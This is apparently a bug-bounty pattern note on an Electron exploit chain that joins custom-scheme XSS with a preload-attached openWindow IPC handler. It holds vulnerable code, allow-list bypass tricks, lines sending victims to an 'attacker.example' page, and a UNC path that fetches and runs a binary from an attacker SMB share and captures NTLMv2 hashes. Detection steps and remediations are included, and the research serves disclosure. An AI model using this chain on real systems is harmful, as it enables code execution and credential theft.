---
type: pattern
title: Pattern - Electron Preload Injection Chain (custom-scheme XSS + openWindow)
tags: [pattern, cwe-79, cwe-88, cwe-346, cwe-20, cwe-668, electron, renderer-to-main-escape, ipc-trust, bb-pattern]
status: verified
severity_range: P1 (CVSS 8.8 High static → 9.6 Critical live)
precedents: CVE-2023-29059 (3CX), CVE-2020-4077 (VSCode), CVE-2024-27288 (Discord)
last_updated: 2026-04-24
---

# Pattern - Electron Preload Injection Chain

## TL;DR

A large class of Electron desktop apps register a **custom URL-scheme protocol handler** that dispatches incoming URIs to `webContents.executeJavaScript(<attackerParam>)` (scheme-XSS). Separately, they expose an **IPC handler** like `navigateObj.openWindow({url})` that spawns a new `BrowserWindow` with **`webPreferences.preload` attached unconditionally** — giving any caller access to the full `contextBridge.exposeInMainWorld` namespace. Combining the two yields **1-click desktop takeover** that defeats `contextIsolation:true`, `webSecurity:true`, and `sandbox` (if unset).

**Neither primitive alone is "RCE-equivalent"**. The chain together is.

## Root-Cause Ingredients (all three confirmed in a real-world case study)

### Ingredient 1 — Scheme-XSS sink

The app registers via `app.setAsDefaultProtocolClient("yourproto", ...)` and wires `app.on("second-instance")` / `app.on("open-url")` to parse incoming URIs:

```javascript
// Typical vulnerable handler
app.on("second-instance", (event, argv) => {
  const url = argv.find(a => a.startsWith("yourproto://"));
  const action = new URL(url).searchParams.get("action");
  if (action === "answerCall") {
    const eventData = new URL(url).searchParams.get("eventData");
    mainWindow.webContents.executeJavaScript(eventData);   // ← raw sink
  }
});
```

This is **CVE-2023-29059 (3CX)** class. The attacker delivers `yourproto://?action=answerCall&eventData=<JS>` via email/chat/auto-opening webpage. The OS routes it to the already-running app. The renderer executes attacker JS.

### Ingredient 2 — Preload-attached openWindow IPC

The renderer-accessible `contextBridge` exposes a navigation API backed by `ipcMain`:

```javascript
// preload.js
contextBridge.exposeInMainWorld("navigateObj", {
  openWindow: (url, isInternal, windowName) =>
    ipcRenderer.send("navigateObj.openWindow", { url, isInternal, windowName })
});

// main.js
ipcMain.on("navigateObj.openWindow", (event, { url, isInternal, windowName }) => {
  // ❌ No event.senderFrame.url check
  // ❌ No url validation / allow-list
  const win = new BrowserWindow({
    webPreferences: {
      preload: path.join(__dirname, "preload.js"),    // ← attached to the attacker URL
      contextIsolation: true,     // doesn't help — contextBridge is DESIGNED to cross
      // no sandbox:true           // would mitigate even if set
    }
  });
  win.loadURL(url);               // ← attacker-controlled URL
});
```

The attacker page loaded in the spawned `BrowserWindow` now has `window.settingObj`, `window.remoteControlObj`, `window.downloadObj`, etc. all exposed.

### Ingredient 3 — shell.openExternal unvalidated dispatch (optional escalator)

The same IPC handler that spawns BrowserWindows often has a second branch that dispatches to `shell.openExternal` when a flag differs:

```javascript
ipcMain.on("navigateObj.openWindow", (event, { url, isInternal, windowName }) => {
  if (isInternal) {
    // BrowserWindow + preload (Ingredient 2 path)
  } else {
    B.shell.openExternal(url);   // ← ZERO validation, ZERO scheme allowlist
  }
});
```

`shell.openExternal("file:///C:/Windows/System32/notepad.exe")` calls Windows `ShellExecuteEx` → opens any `.exe` on the victim machine. **This is "arbitrary process launch" / "arbitrary local application execution"**, NOT "arbitrary code execution" until the attacker proves they can execute attacker-controlled code (via cmd.exe args, an attacker-dropped .exe, a UNC/SMB path, mshta/rundll32 with attacker content, etc.).

## Combined Chain (7 Stages)

1. Attacker delivers a custom-scheme link (`yourproto://?action=X&eventData=<js>`)
2. OS → second-instance handler → attacker JS runs in the main renderer
3. Attacker JS calls `window.navigateObj.openWindow("https://attacker.example/pwn.html", true, "pwn")`
4. `ipcMain.on("navigateObj.openWindow")` — no validation — spawns a new BrowserWindow with preload.js attached
5. The attacker page loads with the full preload IPC surface
6. Attacker calls IPC methods: read files (oracle), enumerate displays, drive mouse/keyboard (if there's an active session), read clipboard, exfiltrate session tokens
7. Recursive `openWindow` → a persistent C2 frame survives even if the main window is closed

## Why Existing Hardening Doesn't Save You

| Hardening | Why it fails |
|-----------|--------------|
| `contextIsolation: true` | `contextBridge` is *designed* to cross into the main world. The attacker calls exposed APIs normally. |
| `webSecurity: true` | Same-origin policy doesn't apply to IPC. IPC is the attack vector, not `fetch`/`XHR`. |
| `nodeIntegration: false` | Doesn't matter — preload.js still has Node access and still exposes IPC. |
| `setWindowOpenHandler` gating | Gates `window.open()` from the renderer. Does NOT gate the **IPC path** through `navigateObj.openWindow`. The attacker uses the IPC path instead. |
| CSP in the renderer | Doesn't prevent the preload APIs from being called. |

**The ONE hardening that would close the chain**: `sandbox: true` on the spawned BrowserWindow. But if the app never sets it, it defaults to `false` in Electron.

## Detection

### Static (source / decompiled asar)

```bash
# Extract asar
npx asar extract app.asar app_extracted

# Find the scheme-XSS sink
grep -rn "executeJavaScript" app_extracted/dist-electron/
grep -rn "executeJavaScript(.*eventData" app_extracted/

# Find setAsDefaultProtocolClient
grep -rn "setAsDefaultProtocolClient" app_extracted/

# Find openWindow-style IPC handlers that spawn a BrowserWindow
grep -rn "new BrowserWindow" app_extracted/ -A 10 | grep -B 5 "preload"

# Enumerate contextBridge exposures
grep -rn "contextBridge.exposeInMainWorld" app_extracted/
```

### Critical red flags

- Any `ipcMain.handle`/`ipcMain.on` that creates a BrowserWindow at a renderer-supplied URL
- The spawned BrowserWindow has `webPreferences.preload: <preloadScript>` attached
- Zero `event.senderFrame.url` / `event.sender.getURL()` validation in the handler
- `app.on("second-instance", ...)` or `app.on("open-url", ...)` handlers pass the URL query-string to `executeJavaScript`

### Dynamic (runtime)

```javascript
// In DevTools of an Electron app, on ANY loaded page:
Object.keys(window).filter(k => typeof window[k] === 'object' && window[k] !== null)
// Look for: {settingObj, downloadObj, navigateObj, remoteControlObj, desktopCaptureObj, ...}
// Any of these = preload-attached; if the page is attacker-controllable, game over
```

## Exploit Technique Notes

### Bypassing `isInternal` gating

If the handler has `if (isInternal) { spawn with preload } else { spawn without }`:
- The attacker just passes `isInternal: true` — there's usually no server-side check verifying "is this URL actually internal"
- Many apps take `isInternal` from the renderer blindly

### Bypassing a URL allow-list

If the check is `url.startsWith("https://vendor.com")`:
- Try `https://vendor.com.attacker.com/` (subdomain confusion)
- Try `https://vendor.com@attacker.com/` (URL userinfo)
- Try `https://attacker.com/?vendor.com` (if `.includes` is used instead of `.startsWith`)

### Chaining with XSS on a vendor origin

If you can't achieve the scheme-XSS ingredient but you DO have XSS on a vendor origin that the app loads:
- The same chain works from the vendor-XSS: call `window.navigateObj.openWindow("attacker.com", true, "x")` → attacker.com now has preload access
- Or stay on the vendor origin and directly abuse the preload APIs — skips one stage

## CVSS Framing

- **Standalone scheme-XSS (ingredient 1)**: CVSS 6-8 depending on what the renderer has access to
- **Standalone openWindow (ingredient 2)**: CVSS 4-6 (requires an already-compromised renderer)
- **Chained**: CVSS 8.8 High static-confirmed → 9.6 Critical with a live PoC (UI:R, AV:N, PR:N, UC:L, S:C, full CIA high)

**Impact-framing ladder**:
- **Baseline** (Ingredients 1+2 only): "1-click desktop takeover + file-read oracle + session-bounded input injection" — CVSS 8.8-9.6, P1-worthy
- **With Ingredient 3** (`shell.openExternal` unvalidated, local .exe): "1-click **arbitrary process launch** / arbitrary local application execution" — still CVSS 9.6; use "arbitrary process launch" NOT "arbitrary code execution"
- **True RCE** (Ingredient 3 + a UNC path to attacker SMB): "**arbitrary remote code execution** — attacker serves a PE from an SMB share, victim machine fetches and executes it" — CVSS 9.6 Critical confirmed. **This was live-confirmed in a real case study**: a PoC binary was fetched from `\\<attacker-lab-ip>\SHARE` and executed on a Windows 11 VM — a launcher-runtime error dialog was proof of execution.

**True RCE claims become valid** when `shell.openExternal` is called with a UNC path to an attacker-controlled SMB server hosting a PE binary. The standard Windows "Open file - Security Warning" dialog adds 1 interaction but does not prevent execution.

**Also confirmed in the case study**: the UNC path triggered NTLMv2 hash capture (an impacket smbserver logged an AUTHENTICATE_MESSAGE → credential theft even when Defender blocks execution).

## Remediations (vendor side; any one closes the chain)

1. **[Highest leverage]** Remove `executeJavaScript(<attackerParam>)` from the scheme-handler — replace with structured IPC + `webContents.send(channel, payload)` to the renderer
2. **Validate the URL in openWindow** against a tenant/server allow-list (strict host-equality, not `.includes`)
3. **Do not attach preload.js to user-navigable external windows** — use `webPreferences: { preload: undefined }` or a stripped preload without sensitive APIs
4. **Validate `event.senderFrame.url`** at every IPC handler — reject messages from non-tenant origins
5. **Set `webPreferences.sandbox: true`** on all BrowserWindows — mitigates even if preload is attached

## Precedents

| CVE | Product | Chain |
|-----|---------|-------|
| CVE-2023-29059 | 3CX desktop | `3cx://` → `executeJavaScript` raw eval (ingredient 1 classic) |
| CVE-2020-4077 | VS Code | Scheme XSS via `ms-vscode://` → extension installation |
| CVE-2024-27288 | Discord | Electron IPC sender-origin spoofing → arbitrary open |
| CVE-2022-26566 | Microsoft Teams | Web/desktop XSS via a custom scheme |

## Case Study

### An Electron messenger app (anonymized; live chain confirmed)

- **Scheme-XSS finding** — `acmemsg://?action=answerCall&eventData=<JS>` → `executeJavaScript(eventData)` in the second-instance handler
- **openWindow finding** — `ipcMain.on("navigateObj.openWindow", ...)` spawns a BrowserWindow with preload.js attached via an internal window-options override, no origin check
- **Absences**: zero URL validation, zero `event.senderFrame.url` check anywhere in the handler
- **Chain live-verified**: Windows 11 + a current Electron version — 13/13 exposed contextBridge namespaces confirmed reachable, CVSS 9.6 Critical
- **LFI live-confirmed**: `navigateObj.openWindow('file:///C:/Windows/System32/drivers/etc/hosts', true, 'lfi')` rendered file content in the Electron window
- **Recursive preload**: `file://`-spawned windows ALSO received preload.js — the attacker could chain `openWindow` calls indefinitely
- **Post-pivot surface**: 13 contextBridge namespaces, 116 IPC methods, file READ confirmed; several related amplifier findings on the same surface
- **Exhaustive audit**: 0 write/exec primitives found among the 116 IPC methods on their own — the honest negative result was documented rather than assumed
- **shell.openExternal finding** — `navigateObj.openWindow(url, false, "")` hit the `else` branch → `B.shell.openExternal(url)` with ZERO validation; `file:///C:/Windows/System32/notepad.exe` was opened on the Windows 11 test VM. Confirms **Ingredient 3**.
- **True RCE confirmed**: `shell.openExternal("\\\\<attacker-lab-ip>\\SHARE\\poc.exe")` → the Windows 11 VM fetched a PE from the attacker's impacket smbserver → **the binary executed** (a launcher-runtime error dialog was proof of execution, not a Windows refusal). Chain proven end-to-end: browser link → `second-instance` handler → `executeJavaScript` → `navigateObj.openWindow(UNC,false,'')` → `shell.openExternal` → SMB connection → PE loaded → attacker code runs. The language **"arbitrary remote code execution"** is valid for this finding.
- **NTLMv2 harvest confirmed**: multiple NTLMv2 hashes were captured by the smbserver — credential theft is achievable even when execution is blocked by an endpoint agent.
- **Near-0-click delivery**: when the app is running in the system tray, the `second-instance` handler fires WITHOUT an OS dialog — the victim only has to click a browser link. The Windows "Open file - Security Warning" dialog still appears before the UNC .exe executes (+1 interaction).

## Pre-Submit Checklist

- [ ] Scheme handler sink identified (line number in the source)
- [ ] openWindow-style IPC with preload-attached spawning identified
- [ ] Both ingredients SOURCE-CONFIRMED (decompiled asar, not speculation)
- [ ] Absence of an `event.senderFrame.url` check verified (grep the whole main.js)
- [ ] Preload `contextBridge.exposeInMainWorld` namespaces enumerated
- [ ] Post-pivot IPC capability audited (file-read? shell? exec? writeFile?)
- [ ] Severity framed honestly — do NOT claim RCE without a shell primitive
- [ ] Precedents cited (CVE-2023-29059, CVE-2020-4077, CVE-2024-27288)
- [ ] Live VM PoC planned (or filed with "static-confirmed, live PoC to follow")

## Related

- [[Pattern - Hardcoded Credentials]]
- [[Pattern - Docker Hub Config Env Exfil]]
- [[Lessons Learned]] — preload-injection lessons
